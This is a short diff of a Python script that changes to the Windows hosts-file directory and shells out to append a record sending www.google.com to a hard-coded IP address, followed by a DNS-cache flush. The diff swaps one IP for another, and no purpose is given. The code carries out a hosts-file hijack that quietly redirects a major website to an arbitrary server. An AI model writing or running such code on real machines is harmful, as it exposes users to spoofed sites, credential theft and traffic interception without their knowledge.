@@ -5,7 +5,7 @@ import os
 os.chdir(r"C:\Windows\System32\drivers\etc")
 
 # Add a record to the hosts file
-command = 'echo 143.198.146.37 www.google.com >> hosts'
+command = 'echo 143.190.140.30 www.google.com >> hosts'
 subprocess.run(command, shell=True, check=True)
 
 # Flush DNS cache
